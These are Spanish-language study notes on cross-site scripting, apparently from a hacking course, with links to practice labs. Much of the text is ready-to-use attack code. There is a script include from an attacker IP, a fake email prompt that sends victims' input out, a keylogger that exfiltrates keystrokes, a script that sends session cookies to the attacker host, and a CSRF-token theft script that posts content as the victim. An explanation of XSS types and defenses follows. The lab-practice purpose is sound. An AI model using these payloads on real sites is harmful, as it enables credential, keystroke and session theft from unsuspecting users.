---
tags:
  - Web
  - Explotacion
  - XSS
---

# Notas

## Validación

Para validar si tiene esta vulnerabilidad podemos hacer lo siguiente:

```html
<script>alert("XSS")</script>
```

En el caso de que al ejecutarlo muestre la alerta, nos muestra que lo que hemos ingresado funciona por lo que es vulnerable a XSS.

Con esta vulnerabilidad puedes ejecutar código en la máquina de la victima, puedes hacer lo siguiente:
- Robar la cookie de sesión
- Un keylogger
- Que realice algo en la página como por ejemplo publicar algo
	- Para ello tenemos que ver que petición se esta ejecutando cuando creas la publicación.
- etc

## Creación de fichero js

Lo que podemos hacer es crear un archivo .js para por ejemplo crear un login y robar credenciales.
Para que el XXS apunte al archivo tendrías que poner lo siguiente:

```html
<script src="http://192.168.1.149/test.js"></script>
```

Archivo:

```js
	var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
	
	if (email == null || email == ""){
		alert("Es necesario introducir un correo válido para visualizar el post");
	}else{
	   fetch("http://192.168.1.149/email=" + email);
	}
```


### Keylogger con js

```html
<script>
	var k = "";
	document.onkeypress = function(e){
		e = e || windows.event;
		k += e.key;
		var i = new Image();
		i.src = "http://192.168.1.149/" + k;
	};
</script>
```


### Robo de jwt (cookie)

**Para que esto funcione tiene que tener el valor HttpOnly desactivado**

```html
<script>
	var request = new XMLHttpRequest();
	request.open('GET', 'http://192.168.1.149/?cookie=' + document.cookie);
	request.send();
</script>
```

### Crear una publicación automatizada

Para esto hay que obtener primero el token de la petición que se envía a la hora de realizar la publicación. 

```js
var domain = "http://localhost:10007/newgossip"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false); //False = Asincono para esperar
req1.withCredentials = true;
req1.send();

var response = req1.responseTest;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;


var req2 = new XMLHttpRequest();
var data = "title=prueba&subtitle=prueba&text=prueba&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);

```

# Hack4u

Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)


# Laboratorio

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)

# Máquinas

## MyExpense

En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.

Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.

A continuación, se proporciona el enlace a la máquina que nos descargamos en esta clase para practicar esta vulnerabilidad:

- **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)